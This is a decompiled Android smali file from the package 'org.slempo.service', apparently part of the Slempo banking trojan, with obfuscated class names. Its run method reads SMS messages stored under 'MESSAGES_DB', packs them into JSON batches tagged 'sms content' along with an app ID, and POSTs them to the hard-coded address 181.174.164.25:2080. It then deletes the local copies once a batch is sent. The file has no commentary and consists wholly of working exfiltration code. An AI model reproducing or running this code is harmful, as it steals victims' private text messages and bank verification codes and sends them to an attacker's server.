.class Lorg/slempo/service/utils/REIOKJDMVIEORHGU$1;
.super Ljava/lang/Object;
.source "REIOKJDMVIEORHGU.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->startSending(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final synthetic val$context:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lorg/slempo/service/utils/REIOKJDMVIEORHGU$1;->val$context:Landroid/content/Context;

    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 18

    .prologue
    .line 31
    move-object/from16 v0, p0

    iget-object v14, v0, Lorg/slempo/service/utils/REIOKJDMVIEORHGU$1;->val$context:Landroid/content/Context;

    const-string v15, "AppPrefs"

    .line 32
    const/16 v16, 0x0

    .line 31
    invoke-virtual/range {v14 .. v16}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v13

    .line 34
    .local v13, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v8, Lorg/json/JSONArray;

    const-string v14, "MESSAGES_DB"

    const-string v15, "[]"

    invoke-interface {v13, v14, v15}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-direct {v8, v14}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    .line 35
    .local v8, "jArray":Lorg/json/JSONArray;
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v14

    if-eqz v14, :cond_2

    .line 36
    const/4 v14, 0x1

    invoke-static {v14}, Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->access$0(Z)V

    .line 37
    new-instance v11, Ljava/util/ArrayList;

    invoke-direct {v11}, Ljava/util/ArrayList;-><init>()V

    .line 38
    .local v11, "messages":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/json/JSONObject;>;"
    const/4 v7, 0x0

    .local v7, "i":I
    :goto_0
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v14

    if-lt v7, v14, :cond_3

    .line 41
    new-instance v6, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v6}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .local v6, "httpclient":Lorg/apache/http/impl/client/DefaultHttpClient;
    move-object v9, v8

    .line 43
    .end local v8    # "jArray":Lorg/json/JSONArray;
    .local v9, "jArray":Lorg/json/JSONArray;
    :goto_1
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    .line 44
    .local v2, "chunk":Lorg/json/JSONArray;
    const/4 v7, 0x0

    :goto_2
    const/16 v14, 0x3e8

    if-ge v7, v14, :cond_0

    invoke-virtual {v11}, Ljava/util/ArrayList;->size()I

    move-result v14

    if-lt v7, v14, :cond_4

    .line 47
    :cond_0
    new-instance v5, Lorg/apache/http/client/methods/HttpPost;

    const-string v14, "http://181.174.164.25:2080/"

    invoke-direct {v5, v14}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 48
    .local v5, "httpPost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v10, Lorg/json/JSONObject;

    invoke-direct {v10}, Lorg/json/JSONObject;-><init>()V

    .line 49
    .local v10, "jObj":Lorg/json/JSONObject;
    const-string v14, "type"

    const-string v15, "sms content"

    invoke-virtual {v10, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 50
    const-string v14, "code"

    const-string v15, "APP_ID"

    const-string v16, "-1"

    move-object/from16 v0, v16

    invoke-interface {v13, v15, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v10, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 51
    const-string v14, "sms"

    invoke-virtual {v10, v14, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 53
    :try_start_1
    const-string v14, "Content-Type"

    const-string v15, "application/json"

    invoke-virtual {v5, v14, v15}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 54
    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v14

    const-string v15, "UTF-8"

    invoke-virtual {v14, v15}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    .line 55
    .local v3, "data":[B
    array-length v14, v3

    int-to-long v14, v14

    .line 56
    move-object/from16 v0, p0

    iget-object v0, v0, Lorg/slempo/service/utils/REIOKJDMVIEORHGU$1;->val$context:Landroid/content/Context;

    move-object/from16 v16, v0

    invoke-virtual/range {v16 .. v16}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v16

    invoke-static/range {v16 .. v16}, Landroid/net/http/AndroidHttpClient;->getMinGzipSize(Landroid/content/ContentResolver;)J

    move-result-wide v16

    cmp-long v14, v14, v16

    if-ltz v14, :cond_1

    .line 57
    const-string v14, "Content-Encoding"

    const-string v15, "gzip"

    invoke-virtual {v5, v14, v15}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 59
    :cond_1
    move-object/from16 v0, p0

    iget-object v14, v0, Lorg/slempo/service/utils/REIOKJDMVIEORHGU$1;->val$context:Landroid/content/Context;

    invoke-virtual {v14}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v14

    invoke-static {v3, v14}, Landroid/net/http/AndroidHttpClient;->getCompressedEntity([BLandroid/content/ContentResolver;)Lorg/apache/http/entity/AbstractHttpEntity;

    move-result-object v14

    invoke-virtual {v5, v14}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 60
    invoke-virtual {v6, v5}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v12

    .line 61
    .local v12, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v12}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v14

    invoke-interface {v14}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v14

    const/16 v15, 0xc8

    if-eq v14, v15, :cond_5

    .line 62
    new-instance v14, Ljava/lang/Exception;

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "Status code "

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 63
    invoke-interface {v12}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v16

    invoke-interface/range {v16 .. v16}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v15

    .line 64
    const-string v16, " "

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    .line 65
    invoke-interface {v12}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v16

    invoke-static/range {v16 .. v16}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;)Ljava/lang/String;

    move-result-object v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    .line 62
    invoke-direct {v14, v15}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    throw v14
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_2
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 76
    .end local v3    # "data":[B
    .end local v12    # "response":Lorg/apache/http/HttpResponse;
    :catch_0
    move-exception v4

    move-object v8, v9

    .line 77
    .end local v9    # "jArray":Lorg/json/JSONArray;
    .local v4, "e":Ljava/lang/Exception;
    .restart local v8    # "jArray":Lorg/json/JSONArray;
    :goto_3
    :try_start_2
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    .line 79
    .end local v4    # "e":Ljava/lang/Exception;
    :goto_4
    invoke-virtual {v11}, Ljava/util/ArrayList;->size()I
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move-result v14

    if-nez v14, :cond_8

    .line 87
    .end local v2    # "chunk":Lorg/json/JSONArray;
    .end local v5    # "httpPost":Lorg/apache/http/client/methods/HttpPost;
    .end local v6    # "httpclient":Lorg/apache/http/impl/client/DefaultHttpClient;
    .end local v7    # "i":I
    .end local v10    # "jObj":Lorg/json/JSONObject;
    .end local v11    # "messages":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/json/JSONObject;>;"
    :cond_2
    const/4 v14, 0x0

    invoke-static {v14}, Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->access$0(Z)V

    .line 89
    .end local v8    # "jArray":Lorg/json/JSONArray;
    :goto_5
    return-void

    .line 39
    .restart local v7    # "i":I
    .restart local v8    # "jArray":Lorg/json/JSONArray;
    .restart local v11    # "messages":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/json/JSONObject;>;"
    :cond_3
    :try_start_3
    invoke-virtual {v8, v7}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v14

    invoke-virtual {v11, v14}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 38
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_0

    .line 45
    .end local v8    # "jArray":Lorg/json/JSONArray;
    .restart local v2    # "chunk":Lorg/json/JSONArray;
    .restart local v6    # "httpclient":Lorg/apache/http/impl/client/DefaultHttpClient;
    .restart local v9    # "jArray":Lorg/json/JSONArray;
    :cond_4
    invoke-virtual {v11, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v14

    invoke-virtual {v2, v14}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_2
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 44
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_2

    .line 67
    .restart local v3    # "data":[B
    .restart local v5    # "httpPost":Lorg/apache/http/client/methods/HttpPost;
    .restart local v10    # "jObj":Lorg/json/JSONObject;
    .restart local v12    # "response":Lorg/apache/http/HttpResponse;
    :cond_5
    const/4 v7, 0x0

    :goto_6
    :try_start_4
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v14

    if-lt v7, v14, :cond_6

    .line 70
    new-instance v8, Lorg/json/JSONArray;

    const-string v14, "[]"

    invoke-direct {v8, v14}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_2
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 71
    .end local v9    # "jArray":Lorg/json/JSONArray;
    .restart local v8    # "jArray":Lorg/json/JSONArray;
    const/4 v7, 0x0

    :goto_7
    :try_start_5
    invoke-virtual {v11}, Ljava/util/ArrayList;->size()I

    move-result v14

    if-lt v7, v14, :cond_7

    .line 74
    const-string v14, "MESSAGES_DB"

    invoke-virtual {v8}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v13, v14, v15}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_2
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    goto :goto_4

    .line 76
    :catch_1
    move-exception v4

    goto :goto_3

    .line 68
    .end local v8    # "jArray":Lorg/json/JSONArray;
    .restart local v9    # "jArray":Lorg/json/JSONArray;
    :cond_6
    const/4 v14, 0x0

    :try_start_6
    invoke-virtual {v11, v14}, Ljava/util/ArrayList;->remove(I)Ljava/lang/Object;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    .line 67
    add-int/lit8 v7, v7, 0x1

    goto :goto_6

    .line 72
    .end local v9    # "jArray":Lorg/json/JSONArray;
    .restart local v8    # "jArray":Lorg/json/JSONArray;
    :cond_7
    :try_start_7
    invoke-virtual {v11, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v14

    invoke-virtual {v8, v14}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1
    .catch Lorg/json/JSONException; {:try_start_7 .. :try_end_7} :catch_2
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 71
    add-int/lit8 v7, v7, 0x1

    goto :goto_7

    .line 84
    .end local v2    # "chunk":Lorg/json/JSONArray;
    .end local v3    # "data":[B
    .end local v5    # "httpPost":Lorg/apache/http/client/methods/HttpPost;
    .end local v6    # "httpclient":Lorg/apache/http/impl/client/DefaultHttpClient;
    .end local v7    # "i":I
    .end local v8    # "jArray":Lorg/json/JSONArray;
    .end local v10    # "jObj":Lorg/json/JSONObject;
    .end local v11    # "messages":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/json/JSONObject;>;"
    .end local v12    # "response":Lorg/apache/http/HttpResponse;
    :catch_2
    move-exception v4

    .line 85
    .local v4, "e":Lorg/json/JSONException;
    :try_start_8
    invoke-virtual {v4}, Lorg/json/JSONException;->printStackTrace()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 87
    const/4 v14, 0x0

    invoke-static {v14}, Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->access$0(Z)V

    goto :goto_5

    .line 86
    .end local v4    # "e":Lorg/json/JSONException;
    :catchall_0
    move-exception v14

    .line 87
    const/4 v15, 0x0

    invoke-static {v15}, Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->access$0(Z)V

    .line 88
    throw v14

    .restart local v2    # "chunk":Lorg/json/JSONArray;
    .restart local v5    # "httpPost":Lorg/apache/http/client/methods/HttpPost;
    .restart local v6    # "httpclient":Lorg/apache/http/impl/client/DefaultHttpClient;
    .restart local v7    # "i":I
    .restart local v8    # "jArray":Lorg/json/JSONArray;
    .restart local v10    # "jObj":Lorg/json/JSONObject;
    .restart local v11    # "messages":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/json/JSONObject;>;"
    :cond_8
    move-object v9, v8

    .end local v8    # "jArray":Lorg/json/JSONArray;
    .restart local v9    # "jArray":Lorg/json/JSONArray;
    goto/16 :goto_1
.end method
